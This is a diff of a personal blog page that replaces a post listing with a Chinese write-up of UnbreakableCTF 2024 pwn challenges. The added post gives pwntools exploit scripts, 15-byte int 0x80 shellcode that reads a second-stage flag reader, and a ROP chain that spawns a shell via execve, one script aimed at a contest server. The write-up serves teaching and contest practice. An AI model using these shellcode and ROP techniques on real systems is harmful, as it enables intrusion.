@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en-us" prefix="og: http://ogp.me/ns#">
+<html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="generator" content="Hugo 0.119.0">
@@ -7,8 +7,8 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="author" content="LittFlower." />
-  <meta property="og:url" content="http://littflower.github.io/" />
-  <link rel="canonical" href="http://littflower.github.io/" /><link rel="alternate" type="application/atom+xml" href="http://littflower.github.ioindex.xml" title="一只花盆.">
+  <meta property="og:url" content="http://littflower.github.io/posts/unbreakablectf2024-writeup/" />
+  <link rel="canonical" href="http://littflower.github.io/posts/unbreakablectf2024-writeup/" /><link rel="alternate" type="application/atom+xml" href="http://littflower.github.ioindex.xml" title="一只花盆.">
 
   <script type="application/ld+json">
   {
@@ -18,10 +18,10 @@
            "@type": "WebPage",
            "@id": "http:\/\/littflower.github.io"
       },
-      "articleSection" : "",
-      "name" : "一只花盆.",
-      "headline" : "一只花盆.",
-      "description" : "",
+      "articleSection" : "posts",
+      "name" : "UnbreakableCTF2024题解及反思",
+      "headline" : "UnbreakableCTF2024题解及反思",
+      "description" : "Unbreakable CTF 2024 Pwn WriteUps 和 NAN 的队友一起打了 UnbreakableCTF 2024 的二进制方向，动手做了两道题，口胡了一道堆题，有一些感悟和反思放在这里。\nharder_assembly 思路 一道 x64 的shellcode 题，难点是禁止在 shellcode 里使用 syscall 以及shellcode 长度只有 15 字节。\n后者比较好解决，可以考虑直接调用 read 构造二次输入，这样二次输入的时候就没有长度限制了，构造 orw 即可。\n这里我遇到的知识盲区主要是禁用了 syscall，解决方法是使用 int 0x80（即继续使用 x32 API）\n翻了一下 stackoverflow，注意到这样一段话：\nWhen called from a 64-bit program it behaves the same way it would behave like if it has been called from a 32-bit program (using the 32-bit calling convention).\nThis also means that the parameters for \u0026ldquo;int 0x80\u0026rdquo; will be passed in 32-bit registers and the upper 32 bits of the 64-bit registers are ignored.",
       "inLanguage" : "en-US",
       "author" : "LittFlower.",
       "creator" : "LittFlower.",
@@ -31,15 +31,27 @@
       "copyrightYear" : "2024",
       "datePublished": "2024-04-08 22:33:57 \u002b0800 CST",
       "dateModified" : "2024-04-08 22:33:57 \u002b0800 CST",
-      "url" : "http:\/\/littflower.github.io\/",
-      "keywords" : [  ]
+      "url" : "http:\/\/littflower.github.io\/posts\/unbreakablectf2024-writeup\/",
+      "keywords" : [ "Pwn","UnbreakableCTF2024", ]
   }
 </script>
-<title>一只花盆.</title>
-  <meta property="og:title" content="一只花盆." />
-  <meta property="og:type" content="website" />
-  <meta property="og:description" content="" />
-  <meta name="description" content="" />
+<title>UnbreakableCTF2024题解及反思</title>
+  <meta property="og:title" content="UnbreakableCTF2024题解及反思" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="Unbreakable CTF 2024 Pwn WriteUps 和 NAN 的队友一起打了 UnbreakableCTF 2024 的二进制方向，动手做了两道题，口胡了一道堆题，有一些感悟和反思放在这里。
+harder_assembly 思路 一道 x64 的shellcode 题，难点是禁止在 shellcode 里使用 syscall 以及shellcode 长度只有 15 字节。
+后者比较好解决，可以考虑直接调用 read 构造二次输入，这样二次输入的时候就没有长度限制了，构造 orw 即可。
+这里我遇到的知识盲区主要是禁用了 syscall，解决方法是使用 int 0x80（即继续使用 x32 API）
+翻了一下 stackoverflow，注意到这样一段话：
+When called from a 64-bit program it behaves the same way it would behave like if it has been called from a 32-bit program (using the 32-bit calling convention).
+This also means that the parameters for &amp;ldquo;int 0x80&amp;rdquo; will be passed in 32-bit registers and the upper 32 bits of the 64-bit registers are ignored." />
+  <meta name="description" content="Unbreakable CTF 2024 Pwn WriteUps 和 NAN 的队友一起打了 UnbreakableCTF 2024 的二进制方向，动手做了两道题，口胡了一道堆题，有一些感悟和反思放在这里。
+harder_assembly 思路 一道 x64 的shellcode 题，难点是禁止在 shellcode 里使用 syscall 以及shellcode 长度只有 15 字节。
+后者比较好解决，可以考虑直接调用 read 构造二次输入，这样二次输入的时候就没有长度限制了，构造 orw 即可。
+这里我遇到的知识盲区主要是禁用了 syscall，解决方法是使用 int 0x80（即继续使用 x32 API）
+翻了一下 stackoverflow，注意到这样一段话：
+When called from a 64-bit program it behaves the same way it would behave like if it has been called from a 32-bit program (using the 32-bit calling convention).
+This also means that the parameters for &amp;ldquo;int 0x80&amp;rdquo; will be passed in 32-bit registers and the upper 32 bits of the 64-bit registers are ignored." />
   <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
   
 
@@ -66,10 +78,11 @@
 
 
 <body>
-  <article class="posts">
+  <article class="post " id="article">
     <div class="row">
       <div class="col-xs-12">
-        
+        <div class="site-header">
+          
 <header>
   <div class="header-title">
     <a href="/"
@@ -98,329 +111,175 @@
 </div>
 <div class="header-line"></div>
 
-        <div id="posts-list">
-          <section>
-            <h1 class="site-date-catalog">2024</h1>
-
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2024-04-08 22:33:57 CST">Apr 08</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/unbreakablectf2024-writeup/">UnbreakableCTF2024题解及反思</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/writeup/"><strong>WriteUp</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2024-01-23 00:25:35 CST">Jan 23</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/asisctf2016-b00ks/">AsisCTF2016 b00ks 复现笔记</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0/"><strong>学习笔记</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-          </section>
-          <section>
-            <h1 class="site-date-catalog">2023</h1>
-
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2023-11-12 18:08:44 CST">Nov 12</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/moectf-2023-pwn-writeup/">MoeCTF 2023 Pwn 题目复现</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/writeup/"><strong>WriteUp</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2023-10-19 21:13:56 CST">Oct 19</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/the-taste-of-archlinux/">ArchLinux 体验日志与感悟</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/%e7%96%af%e8%a8%80%e7%96%af%e8%af%ad/"><strong>疯言疯语</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2023-10-13 20:23:13 UTC">Oct 13</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/moectf2023-unwind-and-a-little-windows-seh/">Windows x86 SEH 机制</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0/"><strong>学习笔记</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2023-09-07 18:23:30 UTC">Sep 07</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/written-before-enrollment/">写在入校前</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/%e7%96%af%e8%a8%80%e7%96%af%e8%af%ad/"><strong>疯言疯语</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2023-02-03 21:27:43 UTC">Feb 03</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/2022-qwbqs-writeup/">2022强网杯青少赛题解</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/writeup/"><strong>WriteUp</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-          </section>
-          <section>
-            <h1 class="site-date-catalog">2022</h1>
-
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2022-08-27 20:23:13 UTC">Aug 27</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/reread-the-wisdom-of-questioning/">重读提问的智慧</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/%e7%96%af%e8%a8%80%e7%96%af%e8%af%ad/"><strong>疯言疯语</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2022-02-27 16:32:44 UTC">Feb 27</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/film-review-of-confucius/">观《孔子》有感</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/%e7%96%af%e8%a8%80%e7%96%af%e8%af%ad/"><strong>疯言疯语</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2022-02-27 00:00:00 UTC">Feb 27</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/learn-something-from-children/">【书感】向儿童学习</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/%e7%96%af%e8%a8%80%e7%96%af%e8%af%ad/"><strong>疯言疯语</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2022-01-01 00:00:00 UTC">Jan 01</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/2022-new-year-speech/">2022 新年致辞</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/%e7%96%af%e8%a8%80%e7%96%af%e8%af%ad/"><strong>疯言疯语</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-          </section>
-          <section>
-            <h1 class="site-date-catalog">2021</h1>
-
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2021-12-25 23:33:07 UTC">Dec 25</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/the-concept-of-love/">关于爱情观</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/%e7%96%af%e8%a8%80%e7%96%af%e8%af%ad/"><strong>疯言疯语</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2021-11-19 00:00:00 UTC">Nov 19</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/blocking-algorithm/">分块思想</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/oi/"><strong>OI</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2021-11-12 00:00:00 UTC">Nov 12</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/collection-of-interval-segment-problems/">区间线段类问题合集</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/oi/"><strong>OI</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-3 col-sm-2">
-                <time datetime="2021-06-18 18:04:39 UTC">Jun 18</time>
-              </div>
-              <div class="posts-title col-xs-9 col-sm-10">
-                <div class="row">
-                  <div class="col-xs-11 col-sm-10">
-                    <a href="/posts/test-of-math/">测试页面（数学公式）</a>
-                  </div>
-                  <div class="col-xs-1 col-sm-2 posts-categories">
-                    
-                    <div class="posts-category">
-                      <a href="/categories/test/"><strong>test</strong></a>
-                    </div>
-                    
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-          </section>
-          
         </div>
+        <header class="post-header">
+          <h1 class="post-title">UnbreakableCTF2024题解及反思</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2024-04-08 22:33:57 CST">
+                08 Apr 2024
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+              <div class="post-author">
+                <a target="_blank" href="https://blog.littflower.top">@LittFlower.</a>
+              </div>
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="unbreakable-ctf-2024-pwn-writeups">Unbreakable CTF 2024 Pwn WriteUps</h1>
+<p>和 NAN 的队友一起打了 UnbreakableCTF 2024 的二进制方向，动手做了两道题，口胡了一道堆题，有一些感悟和反思放在这里。</p>
+<h2 id="harder_assembly">harder_assembly</h2>
+<h3 id="思路">思路</h3>
+<p>一道 x64 的shellcode 题，难点是禁止在 shellcode 里使用 syscall 以及shellcode 长度只有 15 字节。</p>
+<p>后者比较好解决，可以考虑直接调用 <code>read</code> 构造二次输入，这样二次输入的时候就没有长度限制了，构造 orw 即可。</p>
+<p>这里我遇到的知识盲区主要是禁用了 syscall，解决方法是使用 int 0x80（即继续使用 x32 API）</p>
+<p>翻了一下 stackoverflow，注意到这样一段话：</p>
+<blockquote>
+<p>When called from a 64-bit program it behaves the same way it would behave like if it has been called from a 32-bit program (using the 32-bit calling convention).</p>
+</blockquote>
+<blockquote>
+<p>This also means that the parameters for &ldquo;int 0x80&rdquo; will be passed in 32-bit registers and the upper 32 bits of the 64-bit registers are ignored.</p>
+</blockquote>
+<p>所以如果要在 x64下使用 int0x80构造 read 函数系统调用时得注意遵守相应的 x32 API 使用规范。</p>
+<h3 id="脚本">脚本</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./harder&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(proc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>orw <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xb0\x03\xb9\x00</span><span style="color:#e6db74">@@</span><span style="color:#ae81ff">\x00\xcd\x80</span><span style="color:#e6db74">h</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">@@</span><span style="color:#ae81ff">\x00\xc3</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># input()</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(orw)
+</span></span><span style="display:flex;"><span>orw <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;./flag&#34;</span>, <span style="color:#ae81ff">0</span>))
+</span></span><span style="display:flex;"><span>orw <span style="color:#f92672">+=</span> asm(shellcraft<span style="color:#f92672">.</span>sendfile(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x7f</span>))
+</span></span><span style="display:flex;"><span>input()
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(orw)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">In [1]: asm(&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">...</span>:     mov al, <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">...</span>:     mov ecx, <span style="color:#ae81ff">0x404000</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">...</span>:     int <span style="color:#ae81ff">0x80</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">...</span>:     push <span style="color:#ae81ff">0x404000</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">...</span>:     ret
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">...</span>:     <span style="color:#e6db74">&#34;&#34;&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span></code></pre></div><p>构造的第一次 shellcode 贴在脚本下方了。</p>
+<h2 id="heeap">heeap</h2>
+<p>这题我没具体做，自己口胡了个大致思路（因为队友切太快了.jpg</p>
+<p>题目给了 backdoor 函数，用 UAF，先申请 &ldquo;description&rdquo;，然后把对应的 ctf 块位置的 print 函数地址改成 backdoor，free 掉之后申请给 ctf即可（因为观察到 ctf 块和 description 块的大小是一样的，只是 print 函数的相对位置不一样罢了）</p>
+<h2 id="not_allowed">not_allowed</h2>
+<h3 id="思路-1">思路</h3>
+<p><img src="https://s2.loli.net/2024/04/08/VOkrH89C3upTK71.png" alt="image.png"></p>
+<p>题目给了一个很明显的栈溢出漏洞，由于题目函数列表中没有 puts/printf 等输出函数，与其 syscall write 不如 syscall execve，问题在于 gadget 比较少，一开始只看到了 <code>pop_rdi_ret</code> 和 <code>syscall</code>，<code>pop_rsi_ret</code> 和 <code>pop_rdx_ret</code> 都看不到..</p>
+<p>不过这不代表凑不出来 gadgets 去 syscall <code>execve('/bin/sh', 0, 0)</code>，我们想一想要做的无非以下 4 件事情：</p>
+<ul>
+<li>给 rdi搞到sh</li>
+<li>rsi 为 NULL</li>
+<li>rdx 为 NULL</li>
+<li>rax 为 0x3b</li>
+</ul>
+<p>第一个很好做，题目给了 backdoor，可以拿到 /bin/sh 的内存位置；</p>
+<p>第二个不一定非要用 <code>pop_rdi_ret</code>，下面这个也行：</p>
+<pre tabindex="0"><code>0x0000000000401161 : sub rax, rax ; ret
+0x00000000004011c1 : xor rsi, rsi ; mov rsi, rax ; ret
+</code></pre><p>同理，用下面这个可以做到第三个（rax 已经为0）：</p>
+<pre tabindex="0"><code>0x000000000040116e : imul edx ; shr rdx, 0x3f ; ret
+</code></pre><p>至于最后一个，也有两种做法，法一是用下面这个：</p>
+<pre tabindex="0"><code>0x00000000004011ce : inc al ; ret
+</code></pre><p>重复 0x3b 次即可修改 rax 为 0x3b。</p>
+<p>法二可以构造一个 read，读入 0x3b 个数据，利用 rax 储存函数返回值来给 rax 赋值，后者更短一些，不过我图省事直接按第一个打了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./pwn&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(proc)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;35.234.88.19&#34;</span>, <span style="color:#ae81ff">31170</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wish_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401175</span>
+</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40407d</span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401156</span>
+</span></span><span style="display:flex;"><span>xor_rsi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011c1</span>
+</span></span><span style="display:flex;"><span>sub_rax_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401161</span>
+</span></span><span style="display:flex;"><span>imul_edx_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40116e</span>
+</span></span><span style="display:flex;"><span>add_rax_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011ce</span>
+</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011cc</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> flat([wish_addr, pop_rdi_ret, binsh_addr, sub_rax_ret, xor_rsi_ret, imul_edx_ret])
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(add_rax_ret) <span style="color:#f92672">*</span> <span style="color:#ae81ff">59</span> <span style="color:#f92672">+</span> p64(syscall)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># input()</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+            <div class="post-tags">
+              <a href="/tags/pwn/">
+                Pwn
+              </a>
+            </div>
+            
+            <div class="post-tags">
+              <a href="/tags/unbreakablectf2024/">
+                UnbreakableCTF2024
+              </a>
+            </div>
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+<div class="related-content">
+  <h3>Related Posts</h3>
+  <ul>
+    
+    <li><a href="/posts/moectf-2023-pwn-writeup/">MoeCTF 2023 Pwn 题目复现</a></li>
+    
+    <li><a href="/posts/2022-qwbqs-writeup/">2022强网杯青少赛题解</a></li>
+    
+  </ul>
+</div>
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
 
         
 
@@ -478,6 +337,8 @@ document.addEventListener('DOMContentLoaded', (event) => {
     
   
 </script>
+
+  
 
 </body>
 
